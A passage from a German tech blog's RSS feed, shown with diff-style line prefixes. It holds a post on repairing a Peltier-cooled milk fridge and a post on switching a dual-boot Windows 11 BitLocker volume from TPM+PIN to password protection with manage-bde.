-<p>Wenn du das also gerade liest, weil ich dich darauf hingewiesen habe, weißt du jetzt, warum <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f600.png" alt="😀" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<p>Natürlich trifft man oft auf Unverständnis – oder das klassisch deutsche &#8222;Anzeige ist raus!&#8220; begegnet einem immer mal wieder. Es bietet also auch eine gute Möglichkeit, die eigenen Kommunikationsskills zu erweitern.</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2025/01/20/geoguessr-im-cyber-sicherheitskontext-wie-ip-kameras-zum-risiko-werden-koennen/feed/</wfw:commentRss>
-			<slash:comments>3</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Milchkühlschrank: Mein DIY-Projekt mit Reparatur-Tipp</title>
-		<link>https://www.kernel-error.de/2024/12/30/milchkuehlschrank-selber-bauen-mein-diy-projekt-und-warum-reparieren-sich-lohnt/</link>
-					<comments>https://www.kernel-error.de/2024/12/30/milchkuehlschrank-selber-bauen-mein-diy-projekt-und-warum-reparieren-sich-lohnt/#comments</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Mon, 30 Dec 2024 16:29:18 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[Elektro]]></category>
-		<category><![CDATA[Elektrotechnik]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=3040</guid>
-
-					<description><![CDATA[Heute möchte ich euch eine kleine Geschichte zu meinem Milchkühlschrank erzählen. Ob das spannend wird? Na, da bin ich mir noch nicht so sicher. In meiner Küche steht so ein Kaffeevollautomat – einfach wegen lecker Kaffee und so. Dieser ist, bei angeschlossener Milch, auch in der Lage, die gängigen Milchkaffeegetränke (nennt man das so?) auf [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Heute möchte ich euch eine kleine Geschichte zu meinem Milchkühlschrank erzählen. Ob das spannend wird? Na, da bin ich mir noch nicht so sicher.</p>
-
-
-
-<p>In meiner Küche steht so ein Kaffeevollautomat – einfach wegen lecker Kaffee und so. Dieser ist, bei angeschlossener Milch, auch in der Lage, die gängigen Milchkaffeegetränke (nennt man das so?) auf Knopfdruck zuzubereiten. Also alles top. Nun trinke ich, vor allem wenn ich im Homeoffice sitze, schon mal einen Kaffee mehr. Da räume ich natürlich nicht für jeden Kaffee die Milch raus und wieder rein. Damit die Milch mehr als einen halben Tag überlebt, braucht sie etwas Kühlung. Genau an dieser Stelle kommt ein Milchkühlschrank ins Spiel.</p>
-
-
-
-<p>In der Regel basieren solche kleinen Kühlschränke oder Kühlboxen auf einem einfachen thermoelektrischen Kühler namens Peltierelement. Ein solches Peltier-Modul funktioniert recht simpel. Meistens ist es ein kleines, flaches Quadrat mit zwei Leitungen. Schließt man die passende Stromversorgung an, wird eine der beiden Seiten warm und die andere kalt. Das Modul sorgt also dafür, dass es eine Temperaturdifferenz zwischen beiden Seiten gibt.</p>
-
-
-
-<p>Sagen wir einfach mal, das Modul erzeugt immer eine Temperaturdifferenz von 30°C. Bei einer Raumtemperatur von 20°C wäre die eine Seite also bei 20°C und die andere bei -10°C. Gut, das ist nur die halbe Wahrheit, denn die heiße Seite wird im Betrieb wärmer, weil dort zwei Wärmequellen zusammenkommen:</p>
-
-
-
-<p><strong>Wärmeübertragung von der kalten Seite (Peltier-Effekt)</strong>:<br>Der Peltier-Effekt transportiert Wärme von der kalten zur heißen Seite, wenn ein Strom durch das Modul fließt. Diese transportierte Wärme wird an der heißen Seite freigesetzt.</p>
-
-
-
-<p><strong>Joulesche Verlustwärme (Widerstandserwärmung)</strong>:<br>Beim Fließen des elektrischen Stroms durch die Halbleiterelemente des Peltier-Moduls entsteht aufgrund des elektrischen Widerstands zusätzliche Wärme (Joule-Effekt). Diese Wärme erhöht ebenfalls die Temperatur der heißen Seite.</p>
-
-
-
-<p>Kurz gesagt: Man muss die heiße Seite kühlen, damit die kalte Seite auch wirklich kalt wird. Diese wird allerdings nicht unendlich kalt, da wir nur einen Temperaturunterschied erzeugen können. Die Kühlung der heißen Seite ist also sehr wichtig. Dieses Wissen wird später noch hilfreich sein, also bitte kurz merken.</p>
-
-
-
-<p>Zurück zum Milchkühlschrank. Wie funktioniert dieser nun? Um das besser erklären zu können, habe ich euch eine kleine Zeichnung angefertigt:</p>
-
-
-
-<figure class="wp-block-image size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2024/12/Schema.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="957" src="https://www.kernel-error.de/wp-content/uploads/2024/12/Schema-1024x957.jpg" alt="Schematische Darstellung, der Funktion eins Peltier Milchkühlers." class="wp-image-3054" style="width:197px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2024/12/Schema-1024x957.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2024/12/Schema-300x280.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2024/12/Schema-768x717.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2024/12/Schema-676x631.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2024/12/Schema.jpg 1518w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure>
-
-
-
-<p>1 Schaumstoffdämmung, 2 Kühlkörper, 3 Befestigungsschrauben, 4 Peltier Modul, 5 Aluminiumblock</p>
-
-
-
-<p>Die dicke schwarze Linie an der Innenseite der Schaumstoffdämmung stellt eine Metallplatte dar, die die Innenseite des Kühlschranks bildet. Diese ist mit etwas Wärmeleitpaste (für bessere Temperaturübertragung) mit dem Aluminiumblock verbunden. Im Aluminiumblock befinden sich Temperaturfühler, die dafür sorgen, dass das Peltier-Modul bei der gewünschten Temperatur abgeschaltet wird. Die kalte Seite des Moduls ist ebenfalls mit Wärmeleitpaste am Aluminiumblock befestigt, während die heiße Seite mit einem großen Kühlkörper verbunden ist. Dieser Kühlkörper vergrößert die Oberfläche der heißen Seite, sodass die Wärme besser an die Umgebungsluft abgegeben werden kann. Meist ist zusätzlich ein kleiner Lüfter verbaut, der aktiv Luft zuführt.</p>
-
-
-
-<p>Mit diesem Wissen können wir nun alle selbst einen Milchkühlschrank oder eine kleine Kühlbox bauen. Ein oft verwendetes Peltier-Modul ist das <strong><a href="https://amzn.to/4gY81k3" target="_blank" rel="noreferrer noopener">TEC1-12706</a></strong>, das man im Doppelpack für ca. 10 € bekommt. Ein einfacher PC-Lüfter kostet etwa 10 €. Für rund 50 € kann man sich so ein Ding zusammenbauen.</p>
-
-
-
-<p>Warum ist das wichtig? Nun, weil die Dinger für ca. 150 € verkauft werden. Was auch der Grund ist, warum ich mir nicht einfach einen gekauft habe. Denn, mal ehrlich: Wenn ich das für 50 € bauen kann, dann kostet es in der Massenproduktion in China noch weniger. Ja, ich weiß, ich kaufe ja nicht nur das Gerät, sondern auch die Bequemlichkeit – meine Milch bleibt länger frisch, und ich muss mich nicht kümmern. Aber so einfach ist das für mich nicht zu rechtfertigen. Es widerstrebt mir einfach.</p>
-
-
-
-<p>Einen gebrauchten zu kaufen, schien mir da eine Option. Was soll ich sagen? Die Technik, die in solchen Geräten verbaut ist, ist oft billig und nicht auf Langlebigkeit ausgelegt. Von den Geräten, die ich bisher in der Hand hatte, hat keines länger als drei Jahre gehalten. Selbst gebraucht werden sie noch für rund 100 € angeboten. Das ist für mich einfach nicht verhältnismäßig.</p>
-
-
-
-<p>Jetzt stand bei meinem Arbeitgeber plötzlich ein defekter Milchkühlschrank beim Elektroschrott. Das kam für mich überraschend. Natürlich habe ich nachgefragt, was mit dem Gerät los ist und ob es okay wäre, wenn ich es „entsorge“. Es war kein Problem, und so hatte ich einen neuen alten, kaputten Milchkühlschrank.</p>
-
-
-
-<p>Und was hatte das Ding? Nichts Besonderes. Der Lüfter war gestorben, und die passive Kühlung reichte nicht aus, um das Innere des Kühlschranks ausreichend zu kühlen. Verbaut war ein einfacher 80&#215;80 mm 12V PC-Lüfter. Den hatte ich noch in meiner Ersatzteilkiste. Also: Lüfter getauscht, und zack – schon funktionierte der Kühlschrank wieder. Zumindest bis zum Sommer.</p>
-
-
-
-<p>Als die Temperaturen stiegen, wurde es im Kühlschrank nicht mehr richtig kühl, obwohl Lüfter und Peltierelement alles gaben. Ich habe das Gerät wieder aufgeschraubt, weil ich vermutete, dass die Wärmeleitpaste inzwischen hart und trocken war und ausgetauscht werden musste. Der Milchkühlschrank war inzwischen vier, knapp fünf Jahre alt – da kann das schon mal passieren.</p>
-
-
-
-<p>War es die Wärmeleitpaste? Ja und nein. Die Paste war zwar trocken, aber das allein war nicht das Problem. Wenn ihr euch meine Zeichnung anschaut, sind euch vielleicht die Befestigungsschrauben (<strong>3</strong>) aufgefallen. Diese Schrauben sind aus Metall und verbinden den kalten Aluminiumblock direkt mit dem Kühlkörper – also eine klassische <strong>thermische Brücke</strong>. Das heißt: Ein Teil der Kälte wird direkt wieder in Wärme umgewandelt, weil Metall die Wärme gut leitet.</p>
-
-
-
-<p>Das ist … naja, sagen wir mal suboptimal. Es funktioniert irgendwie, aber effizient ist das nicht. Ich habe die Löcher im Kühlkörper daher aufgebohrt und mit meinem 3D-Drucker Kunststoffbuchsen für die Schrauben hergestellt. Diese habe ich zusätzlich mit kleinen Federn versehen, die thermische Brücke ist so unterbrochen und die Felder drücken alles noch zusammen, selbst wenn sich das Aluminium durch die unterschiedlichen Temperaturen ausdehnt bzw. zusammen zieht. Danach war der Kühlschrank deutlich effizienter und verbrauchte spürbar weniger Energie. Warum der Hersteller das nicht von Anfang an so gemacht hat? Tja, irgendwie habe ich nur das Wort „Gewinnmaximierung“ im Kopf.</p>
-
-
-
-<p>Das verbaute Netzteil war ebenfalls nur gerade so passend für die benötigte Leistung. Das ist okay, aber wenn ein Netzteil immer bei 90 bis 100 % Belastung arbeitet, gibt es irgendwann auf. Es funktionierte zwar noch, aber die Messwerte waren nicht optimal, und man konnte ihm die jahrelange Arbeit ansehen. Ich hatte noch ein HOUHUI-1206<strong> </strong>im Regal – ein 12V 6A Gleichstromnetzteil, das ich irgendwann mal bei einem Gerät dabei hatte. Damals wollte ich es nicht einsetzen, weil es so billig aussah. Also lag es herum.</p>
-
-
-
-<p>Hätte ich doch mal auf mein früheres Ich gehört! Denn sechs Monate später war der Kühlschrank wieder warm, und die LED am Netzteil war aus. Das Chinanetzteil hatte den Geist aufgegeben.</p>
-
-
-
-<p>So langsam bröckelte der WAF (Woman Acceptance Factor). Ich sah mich schon einen neuen Milchkühler kaufen. Also habe ich das Netzteil aufgeschraubt und mal reingeschaut. Überraschung: Die Elektrolytkondensatoren (Elkos) waren aufgebläht – ein klassischer Fehler. Ich habe die Elkos getauscht, und schon funktionierte alles wieder.</p>
-
-
-
-<div class="wp-block-envira-envira-gallery"><div class="envira-gallery-feed-output"><img decoding="async" class="envira-gallery-feed-image" src="https://www.kernel-error.de/wp-content/uploads/2024/12/Dicke-Elkos-im-Netzteil-676x507-640x480.jpg" title="Dicke-Elkos-im-Netzteil" alt="An der Sollbruchstelle geplatzte Elektrolytkondensator im HOUHUI-1206 Netzteil." /></div></div>
-
-
-
-<p>Natürlich habe ich den Strombedarf des Kühlschranks gemessen, um sicherzugehen, dass das Netzteil nicht ständig an seiner Leistungsgrenze arbeitet. Ich bin nicht an die Grenze von 6A gekommen, aber trotzdem behalte ich das im Auge. Denn: 12V und 6A bedeuten 72 Watt. Wenn der kleine Milchkühlschrank 24/7 mit 70 Watt läuft, dann ist das auf Dauer auch zu teuer.</p>
-
-
-
-<p>So viel also zu meiner Geschichte des Milchkühlschranks. Ob ich am Ende einen neuen kaufe? Vielleicht. Aber bis dahin läuft mein reparierter Milchkühlschrank wieder.</p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2024/12/30/milchkuehlschrank-selber-bauen-mein-diy-projekt-und-warum-reparieren-sich-lohnt/feed/</wfw:commentRss>
-			<slash:comments>5</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>BitLocker im Dual-Boot: Systemplatte auf Passwortschutz umstellen​</title>
-		<link>https://www.kernel-error.de/2024/12/25/dual-boot-mit-linux-und-windows-bitlocker-fuer-die-systemplatte-auf-passwort-umstellen/</link>
-					<comments>https://www.kernel-error.de/2024/12/25/dual-boot-mit-linux-und-windows-bitlocker-fuer-die-systemplatte-auf-passwort-umstellen/#respond</comments>
-		
-		<dc:creator><![CDATA[kernel-error]]></dc:creator>
-		<pubDate>Wed, 25 Dec 2024 13:03:15 +0000</pubDate>
-				<category><![CDATA[Kernel-Error-Blog]]></category>
-		<category><![CDATA[BitLocker]]></category>
-		<category><![CDATA[Encryption]]></category>
-		<category><![CDATA[Password]]></category>
-		<category><![CDATA[Security]]></category>
-		<category><![CDATA[Windows 11]]></category>
-		<guid isPermaLink="false">https://www.kernel-error.de/?p=2755</guid>
-
-					<description><![CDATA[Die Feiertage sind da, und ich hatte tatsächlich etwas Zeit zum Zocken. Früher hatte ich dafür einen eigenen Rechner, heute reicht ein Dual Boot. Gearbeitet wird unter Linux, gezockt unter Windows. Dafür habe ich mein Windows auf einer gesonderten SSD installiert. Natürlich ist diese ebenfalls verschlüsselt, in diesem Fall mit BitLocker. Warum erzähle ich das? [&#8230;]]]></description>
-										<content:encoded><![CDATA[
-<p>Die Feiertage sind da, und ich hatte tatsächlich etwas Zeit zum Zocken. Früher hatte ich dafür einen eigenen Rechner, heute reicht ein Dual Boot. Gearbeitet wird unter Linux, gezockt unter Windows. Dafür habe ich mein Windows auf einer gesonderten SSD installiert. Natürlich ist diese ebenfalls verschlüsselt, in diesem Fall mit BitLocker.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-full is-resized"><img loading="lazy" decoding="async" width="640" height="640" src="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM.jpg" alt="Illustration eines Dual-Boot-Systems mit Linux und Windows, dargestellt durch die Logos beider Betriebssysteme. Die Windows-Seite zeigt ein BitLocker-Schloss-Symbol, das auf die Verschlüsselung der Systemplatte hinweist." class="wp-image-2769" style="width:51px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM.jpg 640w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-300x300.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-150x150.jpg 150w" sizes="auto, (max-width: 640px) 100vw, 640px" /></figure></div>
-
-
-<p>Warum erzähle ich das? Na, weil die SSD irgendwann aufgegeben hat und ich mein Windows neu installieren darf. Ein Backup spare ich mir, da es eh nur zum Zocken ist.</p>
-
-
-
-<p>Windows 11 war &#8222;schnell&#8220; wieder installiert. Dann noch alle Treiber usw. – Gott, ist das noch immer alles aufwendig&#8230; Wie auch immer: Windows 11 und die Games sind drauf. Los geht’s!</p>
-
-
-
-<p>Nun fragt mich mein BitLocker bei jedem Start der Betriebssystemfestplatte nach dem BitLocker-Wiederherstellungsschlüssel, wenn ich vorher in meinem Linux war. Da zuckt so eine Erinnerung durch mein Hirn: Das gleiche hatte ich schon mal, am gleichen Rechner. Wie hatte ich das damals gelöst? Ich habe nichts darüber geschrieben, also ist es einfach weg. Diesen Fehler mache ich nicht noch mal. Also liest du gerade etwas darüber. <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<p>Der Ausgangspunkt: Ein Windows 11 Pro, installiert auf einer SSD, inkl. BitLocker-Verschlüsselung und TPM mit PIN. Warum PIN? Ich fühle mich einfach besser, wenn es noch eine manuelle Hürde zur Entschlüsselung gibt; Ist auch egal, soll ja nun weg.</p>
-
-
-
-<p>Terminal als Administrator ausführen und dann:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32> manage-bde -status
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Datenträgervolumes, die mit BitLocker-Laufwerkverschlüsselung
-geschützt werden können:
-Volume "C:" [System]
-[Betriebssystemvolume]
-
-    Größe:                        465,00 GB
-    BitLocker-Version:            2.0
-    Konvertierungsstatus:         Nur verwendeter Speicherplatz ist verschlüsselt
-    Verschlüsselt (Prozent):      100,0 %
-    Verschlüsselungsmethode:      XTS-AES 128
-    Schutzstatus:                 Der Schutz ist aktiviert.
-    Sperrungsstatus:              Entsperrt
-    ID-Feld:                      Unbekannt
-    Schlüsselschutzvorrichtungen:
-        Numerisches Kennwort
-        TPM und PIN
-        TPM
-C:\Windows\System32></pre>
-
-
-
-<p>Schlüsselschutzvorrichtungen sind also numerisches Kennwort, TPM und PIN, sowie TPM. Was fehlt? Richtig, das Password. Da ich nur das Password möchte, kann im Grunde alles weg. Damit Windows 11 mir erlaubt, TPM von meinem Betriebssystemvolume zu entfernen, muss ich vorher noch eine Gruppenrichtlinie anpassen.</p>
-
-
-
-<p>Dafür einfach die Tastenkombination <strong>Win + S</strong> drücken und nach <em>Gruppenrichtlinie bearbeiten</em> suchen.</p>
-
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="607" src="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-1024x607.jpg" alt="Editor für lokale Gruppenrichtlinien mit geöffneter Einstellung 'Zusätzliche Authentifizierung beim Start anfordern' unter 'Computerkonfiguration &gt; Administrative Vorlagen &gt; BitLocker-Laufwerkverschlüsselung &gt; Betriebssystemlaufwerke'. Die Option ist aktiviert, um die BitLocker-Verschlüsselung ohne TPM zu ermöglichen." class="wp-image-2758" style="width:228px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-1024x607.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-300x178.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-768x455.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-1536x910.jpg 1536w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001-676x400.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-001.jpg 1570w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure></div>
-
-<div class="wp-block-image">
-<figure class="alignleft size-large is-resized"><a href="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002.jpg" target="_blank" rel=" noreferrer noopener"><img loading="lazy" decoding="async" width="1024" height="801" src="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002-1024x801.jpg" alt="Detailansicht der Gruppenrichtlinieneinstellung 'Zusätzliche Authentifizierung beim Start anfordern'. Die Option 'BitLocker ohne kompatibles TPM zulassen' ist aktiviert, und die Konfiguration für TPM-Start, Systemstartschlüssel und PIN wird angezeigt. Die Beschreibung auf der rechten Seite erläutert die Auswirkungen der Richtlinie." class="wp-image-2759" style="width:231px;height:auto" srcset="https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002-1024x801.jpg 1024w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002-300x235.jpg 300w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002-768x601.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002-676x529.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2024/12/BitLocker-ohne-TPM-002.jpg 1397w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /></a></figure></div>
-
-
-<p>Dann zu:<br><strong>Computerkonfiguration</strong> ⇒ <strong>Administrative Vorlagen</strong> ⇒ <strong>BitLocker-Laufwerkverschlüsselung</strong> ⇒ <strong>Betriebssystemlaufwerke</strong> ⇒ <strong>Zusätzliche Authentifizierung beim Start anfordern.</strong></p>
-
-
-
-<p>Hier die Einstellung so ändern, dass der Haken bei <em>&#8222;BitLocker ohne kompatibles TPM zulassen&#8220;</em> gesetzt ist.</p>
-
-
-
-<p>Im Anschluss sicherstellen, dass die neue Gruppenrichtlinie auch angewendet wird. Dazu im Administrator-Terminal einfach ein kurzes:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS C:\WINDOWS\system32> gpupdate /force
-Die Richtlinie wird aktualisiert...
-
-Die Aktualisierung der Computerrichtlinie wurde erfolgreich abgeschlossen.
-Die Aktualisierung der Benutzerrichtlinie wurde erfolgreich abgeschlossen.
-
-PS C:\WINDOWS\system32></pre>
-
-
-
-<p>So, jetzt wird&#8217;s spannend. Erstmal alle Schlüsselschutzvorrichtungen deaktivieren, dann löschen, die neue Schlüsselschutzvorrichtung <em>Password</em> hinzufügen und alles wieder aktivieren. Das Ganze natürlich im Administrator-Terminal. Ich starte damit, alle Schlüsselschutzvorrichtungen zu deaktivieren:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -disable C:
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Die Schlüsselschutzvorrichtungen für Volume "C:" sind deaktiviert.</pre>
-
-
-
-<p>Als Nächstes schaue ich nach, welche Schlüsselschutzvorrichtungen auf meinem Betriebssystemvolume eingerichtet sind.</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -get C:
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Volume "C:" [System]
-Alle Schlüsselschutzvorrichtungen
-
-    Numerisches Kennwort:
-      ID: {AF6C0AAD-B337-4519-8D66-C06386994D97}
-      Kennwort:
-        673101-147301-650001-335379-291368-420618-438350-305327
-      Sicherungstyp:
-        In Datei gespeichert
-
-    TPM und PIN:
-      ID: {D5F87162-5556-4C27-82F9-25B389DBAF1B}
-      PCR-Validierungsprofil:
-        0, 2, 4, 11
-
-    TPM:
-      ID: {CA1BF147-2C40-4934-9161-660FBB44BA2C}
-      PCR-Validierungsprofil:
-        0, 2, 4, 11</pre>
-
-
-
-<p>Jetzt lösche ich alle Schlüsselschutzvorrichtungen anhand ihrer IDs:</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -delete C: -id {D5F87162-5556-4C27-82F9-25B389DBAF1B}
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Volume "C:" [System]
-Schlüsselschutzvorrichtung mit ID {D5F87162-5556-4C27-82F9-25B389DBAF1B}
-
-    TPM und PIN:
-      ID: {D5F87162-5556-4C27-82F9-25B389DBAF1B}
-      PCR-Validierungsprofil:
-        0, 2, 4, 11
-
-Die Schlüsselschutzvorrichtung mit der ID "{D5F87162-5556-4C27-82F9-25B389DBAF1B}" wurde gelöscht.
-
-C:\Windows\System32>manage-bde -protectors -delete C: -id {CA1BF147-2C40-4934-9161-660FBB44BA2C}
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Volume "C:" [System]
-Schlüsselschutzvorrichtung mit ID {CA1BF147-2C40-4934-9161-660FBB44BA2C}
-
-    TPM:
-      ID: {CA1BF147-2C40-4934-9161-660FBB44BA2C}
-      PCR-Validierungsprofil:
-        0, 2, 4, 11
-
-Die Schlüsselschutzvorrichtung mit der ID "{CA1BF147-2C40-4934-9161-660FBB44BA2C}" wurde gelöscht.
-
-C:\Windows\System32>manage-bde -protectors -delete C: -id {AF6C0AAD-B337-4519-8D66-C06386994D97}
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Volume "C:" [System]
-Schlüsselschutzvorrichtung mit ID {AF6C0AAD-B337-4519-8D66-C06386994D97}
-
-    Numerisches Kennwort:
-      ID: {AF6C0AAD-B337-4519-8D66-C06386994D97}
-      Kennwort:
-        673101-147301-650001-335379-291368-420618-438350-305327
-      Sicherungstyp:
-        In Datei gespeichert
-
-Die Schlüsselschutzvorrichtung mit der ID "{AF6C0AAD-B337-4519-8D66-C06386994D97}" wurde gelöscht.</pre>
-
-
-
-<p>Wenn ich jetzt noch einmal kontrolliere, welche Schlüsselschutzvorrichtungen ich habe, sollten dort keine mehr stehen.</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -get C:
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Volume "C:" [System]
-Alle Schlüsselschutzvorrichtungen
-
-FEHLER: Es wurden keine Schlüsselschutzvorrichtungen gefunden.</pre>
-
-
-
-<p>Damit kann ich jetzt meine neue, gewünschte Schlüsselschutzvorrichtung <em>Passwort</em> hinzufügen.</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -add C: -password
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Geben Sie das Kennwort ein, das zum Schützen des Volumes verwendet werden soll:
-
-Bestätigen Sie das Kennwort durch erneute Eingabe:
-
-Hinzugefügte Schlüsselschutzvorrichtungen:
-
-    Kennwort:
-      ID: {4D141862-4C75-4321-AA6D-8BABB89C601C}</pre>
-
-
-
-<p>Bleibt nur noch, diese auch zu aktivieren.</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -protectors -enable C:
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Die Schlüsselschutzvorrichtungen für Volume "C:" sind aktiviert.</pre>
-
-
-
-<p>Wenn ich jetzt den BitLocker-Status prüfe, ist alles aktiv, und es gibt nur noch die Schlüsselschutzvorrichtung <em>Kennwort / Password</em>!</p>
-
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">C:\Windows\System32>manage-bde -status
-BitLocker-Laufwerkverschlüsselung: Konfigurationstool, Version 10.0.26100
-Copyright (C) 2013 Microsoft Corporation. Alle Rechte vorbehalten.
-
-Datenträgervolumes, die mit BitLocker-Laufwerkverschlüsselung
-geschützt werden können:
-Volume "C:" [System]
-[Betriebssystemvolume]
-
-    Größe:                        465,00 GB
-    BitLocker-Version:            2.0
-    Konvertierungsstatus:         Nur verwendeter Speicherplatz ist verschlüsselt
-    Verschlüsselt (Prozent):      100,0 %
-    Verschlüsselungsmethode:      XTS-AES 128
-    Schutzstatus:                 Der Schutz ist aktiviert.
-    Sperrungsstatus:              Entsperrt
-    ID-Feld:                      Unbekannt
-    Schlüsselschutzvorrichtungen:
-        Kennwort</pre>
-
-
-
-<p>Starte ich meinen Computer und wähle im Grub Windows aus, werde ich danach nach meinem BitLocker-Kennwort gefragt, und das System fährt sauber hoch.</p>
-
-
-
-<p>Fragen? Dann fragen <img src="https://s.w.org/images/core/emoji/15.1.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
-
-
-
-<p></p>
-]]></content:encoded>
-					
-					<wfw:commentRss>https://www.kernel-error.de/2024/12/25/dual-boot-mit-linux-und-windows-bitlocker-fuer-die-systemplatte-auf-passwort-umstellen/feed/</wfw:commentRss>
-			<slash:comments>0</slash:comments>
-		
-		
-			</item>
-		<item>
-		<title>Lötdampfabsaugung selber bauen: DIY-Projekt mit 3D-Druck und Restteilen​</title>
-		<link>https://www.kernel-error.de/2024/11/09/loetdampfabsaugung-aus-resten/</link>
